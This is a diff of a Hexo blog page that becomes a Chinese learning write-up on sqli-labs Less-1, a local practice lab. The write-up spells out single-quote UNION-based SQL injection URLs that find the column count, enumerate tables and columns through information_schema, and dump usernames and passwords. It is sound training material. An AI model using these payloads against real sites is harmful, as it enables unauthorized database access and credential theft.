@@ -6,17 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://xyel.ml">
-  <title>Tag: xyel | xyel的Hexo小站</title>
+  <title>sqli-lab01 | xyel的Hexo小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这里是xyel的Hexo小站，欢迎米娜桑的访问！">
-<meta property="og:type" content="website">
-<meta property="og:title" content="xyel的Hexo小站">
-<meta property="og:url" content="https://xyel.ml/tags/xyel/index.html">
+  <meta name="description" content="sqli-lab学习过程01">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab01">
+<meta property="og:url" content="https://xyel.ml/sqli-lab01.html">
 <meta property="og:site_name" content="xyel的Hexo小站">
-<meta property="og:description" content="这里是xyel的Hexo小站，欢迎米娜桑的访问！">
+<meta property="og:description" content="sqli-lab学习过程01">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-09-15T13:33:29.000Z">
+<meta property="article:modified_time" content="2020-09-15T16:08:26.893Z">
 <meta property="article:author" content="xyel">
-<meta property="article:tag" content="xyel">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
   
   
@@ -147,60 +151,212 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-sqli-lab01" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/about-xyel.html" class="archive-article-date">
-  	<time datetime="2020-09-12T05:09:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/about-xyel.html">about-xyel</a>
+    <h1 class="article-title" itemprop="name">
+      sqli-lab01
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/sqli-lab01.html" class="archive-article-date">
+  	<time datetime="2020-09-15T13:33:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sqli-lab学习过程01"><a href="#sqli-lab学习过程01" class="headerlink" title="sqli-lab学习过程01"></a>sqli-lab学习过程01</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><a id="more"></a>
+
+<p>本地搭建<code>http://e.ee/s</code>作为简短的域名方便进行操作</p>
+<h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p>输入?id=1后<a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=1%E5%87%BA%E7%8E%B0%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">http://e.ee/s/Less-1/?id=1出现用户名和密码</a><br>既然是第一关  那么加<code>&#39;</code>报错<br><code>可以确定输入参数的内容被存放到一对单引号中间，</code><br><code>猜想：输入的1在数据库中出现的位置为：select...from...where id=&#39;1&#39;...</code></p>
+<p>然后试了好几次都没对<br>由于这里php的环境是本地搭建  所以可能受版本影响（推测）</p>
+<blockquote>
+<p>这里后面之所以要用%23是因为这里我们的url在ger方式提交的时候要进行一次url转码 所以我们要让转码后的字符为#来闭合语句</p>
+</blockquote>
+<p>由dalao的writeup可得</p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=1%27%20order%20by%203">http://e.ee/s/Less-1/?id=1%27%20order%20by%203</a></p>
+<p>如上写法是错误的，正确的写法应该是</p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=1%27%20order%20by%204%23">http://e.ee/s/Less-1/?id=1%27%20order%20by%204%23</a></p>
+<p><code>另外补充一点：这里的%23不能用#代替  我也不知道为什么  问就是实践出真知</code></p>
+<p>当字段数为4的时候报错  即字段数为3</p>
+<p><code>还有一点：要么把id的数字去掉，要么把id取一个不存在的值，不然查询不到结果</code></p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=%27%20union%20select%201,2,3%23">http://e.ee/s/Less-1/?id=%27%20union%20select%201,2,3%23</a></p>
+<p>id取不存在的值  %23  缺一不可</p>
+<p>发现2，3两个数字是有回显的</p>
+<p>用最简单的database()和version()查询当前库名和版本没有问题</p>
+<p>database()为security</p>
+<p>那就直接抄家伙  information_schema  注意加上%23闭合</p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=%27union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1%23">http://e.ee/s/Less-1/?id=%27union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1%23</a></p>
+<p>查询出0,1为emails我们再往下  1,1为referers  2,1为uagents  3,1为users  4,1啥也没有</p>
+<p>众所周知肯定users里有好东西</p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=%27union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%20limit%200,1%23">http://e.ee/s/Less-1/?id=%27union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%20limit%200,1%23</a></p>
+<p>0,1  id  1,1 username  2,1  password  3,1  啥也不是</p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=%27union%20select%201,2,password%20from%20users%20%20limit%200,1%23">http://e.ee/s/Less-1/?id=%27union%20select%201,2,password%20from%20users%20%20limit%200,1%23</a></p>
+<p>得到0,1的password为Dumb  以此类推</p>
+<blockquote>
+<p>思考：数据库很长的话一个一个搜很麻烦  如何实现一串代码将所有内容都输出出来？</p>
+</blockquote>
+<p>翻dalao writeup  ing</p>
+<blockquote>
+<p>查看所有数据库名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1&#x2F;Less-1&#x2F;?id&#x3D;%27%20union%20select%20null,(select%20group_concat(schema_name)%20from%20information_schema.schemata),null%23</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>转义一下<a target="_blank" rel="noopener" href="http://127.0.0.1/sql1/Less-1/?id=%E2%80%98">http://127.0.0.1/sql1/Less-1/?id=‘</a> union select null,(select group_concat(schema_name) from information_schema.schemata),null%23</p>
+<p>与我之前写的相比较</p>
+<p><a target="_blank" rel="noopener" href="http://e.ee/s/Less-1/?id=%E2%80%99union">http://e.ee/s/Less-1/?id=’union</a> select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1%23</p>
+<p>恕我直言直接比较我没看懂   那还是直接引用吧  </p>
+<blockquote>
+<p>接下来数据库名称得到以后我们要进行获取表名 操作语句 这里你会遇见 直接table_schema=你想查的数据库名 这样行不通 得把它转换为16进制在赋值给前面才能成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对16进制的解释http:&#x2F;&#x2F;127.0.0.1&#x2F;s&#x2F;Less-1&#x2F;?id&#x3D;’ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; 0x7365637572697479 and table_name&#x3D;0x7573657273)%23</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1&#x2F;Less-1&#x2F;?id&#x3D;%27union%20select%20null,null,(select%20group_concat(table_name)%20from%20information</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>看到表名中有一个叫做users的表应该有点东西 接下来我们爆列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1&#x2F;Less-1&#x2F;?id&#x3D;%27union%20select%20null,null,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27)%23</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>可以看见里面有username password这些关键字 我们就可以爆字段了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1&#x2F;Less-1&#x2F;?id&#x3D;%27union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>成功爆出字段usernamepassword字段名  0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
+</blockquote>
+<p>由dalao操作可以看到直接实现了查询所有用户的username和password</p>
+<blockquote>
+<p>什么你说sqlmap一把梭？风太大我听不见</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">xyel</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/sqli-lab01.html" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/burp.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">burp</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -223,9 +379,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
